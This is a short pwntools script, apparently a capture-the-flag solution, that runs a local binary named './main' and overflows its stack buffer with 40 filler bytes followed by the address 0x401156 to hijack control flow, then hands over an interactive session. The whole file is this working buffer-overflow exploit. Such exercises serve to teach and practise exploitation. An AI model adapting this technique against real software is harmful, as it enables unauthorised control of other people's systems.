from pwn import *

p = process("./main")
p.sendline(b'A'*40 + p64(0x401156))
p.interactive()